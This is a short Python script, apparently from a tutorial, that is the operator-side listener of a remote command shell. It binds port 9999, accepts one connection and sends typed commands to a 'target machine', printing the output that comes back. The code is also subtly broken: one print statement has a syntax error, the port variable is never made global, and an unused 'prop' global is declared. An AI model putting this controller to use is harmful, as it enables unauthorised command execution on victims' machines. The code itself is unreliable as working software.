import socket
import sys


# Create Socket (Connection Method)
def socket_create():
    try:
        global host
        global prop
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind Socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global prop
        global s
        print("Binding Socket to port: " + str(port))
        # pass a Tuple to bind method
        s.bind((host, port))
        # Allows server to make connections, 4 is limit of bad connections.
        s.listen(4)
    except socket.error as msg:
        print("Socket binding error: " str(msg) + "\n" + "Retrying...")
        socket_bind()

# Establish a connection with client (Socket must be listening for them).
def socket_accept():
    # address[0] -> IP Address, address[1] -> Port Number, conn -> Reference to the connection itself
    conn, address = s.accept()
    send_commands(conn)
    conn.close()


# Send Commands to target machine
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        # Check that user sends actual data.
        if len(str.encode(cmd)) > 0:
            # Comes as Bytes
            conn.send(str.encode(cmd))
            # Convert to String
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


if __name__ == "__main__":
    main()    